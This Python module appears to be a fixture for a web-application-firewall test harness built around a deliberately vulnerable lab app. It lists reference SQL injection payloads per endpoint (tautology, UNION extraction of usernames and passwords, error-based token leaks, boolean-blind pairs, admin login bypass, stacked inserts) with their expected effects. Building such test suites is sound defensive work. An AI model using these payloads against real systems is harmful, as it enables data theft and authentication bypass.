"""One reference payload per (endpoint, family) with its observable effect without WAF."""

from dataclasses import dataclass
from typing import Literal

from vulnapp.queries import Family

ExpectationKind = Literal[
    "extra_rows", "rows_contain", "error_text", "blind_pair", "side_effect_author"
]

TOKEN_CAST = "CAST((SELECT token FROM canary_secrets) AS int)"
INTEGER_SYNTAX_ERROR = "invalid input syntax for type integer"
STACKED_COMMENT_INSERT = (
    "INSERT INTO comments (product_id, author, body) VALUES (1, '{author}', 'injected')"
)


@dataclass(frozen=True)
class Expectation:
    kind: ExpectationKind
    value: str


@dataclass(frozen=True)
class ReferencePayload:
    endpoint: str
    family: Family
    param: str
    text: str
    expect: Expectation


def stacked_insert(author: str) -> str:
    return STACKED_COMMENT_INSERT.format(author=author)


REFERENCE_PAYLOADS: tuple[ReferencePayload, ...] = (
    ReferencePayload(
        "catalog", "tautology", "category", "' OR '1'='1' --", Expectation("extra_rows", "Libros")
    ),
    ReferencePayload(
        "catalog",
        "union",
        "category",
        "' UNION SELECT id, username, 0, role FROM users --",
        Expectation("rows_contain", "admin"),
    ),
    ReferencePayload(
        "search",
        "union",
        "q",
        "' UNION SELECT id, username, 0 FROM users --",
        Expectation("rows_contain", "admin"),
    ),
    ReferencePayload(
        "search",
        "error",
        "q",
        f"' AND 1={TOKEN_CAST} --",
        Expectation("error_text", INTEGER_SYNTAX_ERROR),
    ),
    ReferencePayload(
        "search",
        "boolean_blind",
        "q",
        "lap%' AND 1=1 --",
        Expectation("blind_pair", "lap%' AND 1=2 --"),
    ),
    ReferencePayload(
        "product",
        "union",
        "id",
        "0 UNION SELECT id, username, 0, password FROM users --",
        Expectation("rows_contain", "admin123"),
    ),
    ReferencePayload(
        "product",
        "error",
        "id",
        f"1 AND 1={TOKEN_CAST}",
        Expectation("error_text", INTEGER_SYNTAX_ERROR),
    ),
    ReferencePayload(
        "product", "boolean_blind", "id", "3 AND 1=1", Expectation("blind_pair", "3 AND 1=2")
    ),
    ReferencePayload(
        "login", "tautology", "username", "admin' --", Expectation("rows_contain", "admin")
    ),
    ReferencePayload(
        "sort",
        "error",
        "order",
        TOKEN_CAST,
        Expectation("error_text", INTEGER_SYNTAX_ERROR),
    ),
    ReferencePayload(
        "sort",
        "boolean_blind",
        "order",
        "id, (SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END)",
        Expectation("blind_pair", "id, (SELECT CASE WHEN 1=2 THEN 1 ELSE 1/0 END)"),
    ),
    ReferencePayload(
        "comments",
        "stacked",
        "body",
        f"x'); {stacked_insert('stacked-comment')}; --",
        Expectation("side_effect_author", "stacked-comment"),
    ),
    ReferencePayload("orders", "tautology", "user_id", "2 OR 1=1", Expectation("extra_rows", "2")),
    ReferencePayload(
        "orders",
        "union",
        "user_id",
        "0 UNION SELECT id, id, 0, username FROM users",
        Expectation("rows_contain", "admin"),
    ),
    ReferencePayload(
        "orders", "boolean_blind", "user_id", "2 AND 1=1", Expectation("blind_pair", "2 AND 1=2")
    ),
    ReferencePayload(
        "cart_add",
        "error",
        "qty",
        TOKEN_CAST,
        Expectation("error_text", INTEGER_SYNTAX_ERROR),
    ),
    ReferencePayload(
        "cart_add",
        "stacked",
        "qty",
        f"1); {stacked_insert('stacked-cart')}; --",
        Expectation("side_effect_author", "stacked-cart"),
    ),
)
